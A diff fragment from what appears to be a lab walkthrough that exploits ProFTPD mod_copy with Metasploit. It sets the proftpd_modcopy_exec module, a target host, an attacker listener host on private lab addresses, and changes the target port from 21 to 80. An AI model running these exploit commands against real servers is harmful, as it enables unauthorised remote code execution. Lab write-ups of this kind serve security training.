@@ -69,7 +69,7 @@ We choose `exploit/unix/ftp/proftpd_modcopy_exec` and configure it.
 use exploit/unix/ftp/proftpd_modcopy_exec
 set RHOSTS 172.28.128.3
 set LHOST 172.28.128.100
-set RPORT 21
+set RPORT 80
 ```
 
 ![Setting Exploit Options](screenshots/5.Selecting_The_Exploit_And_Setting_Parameters.png)
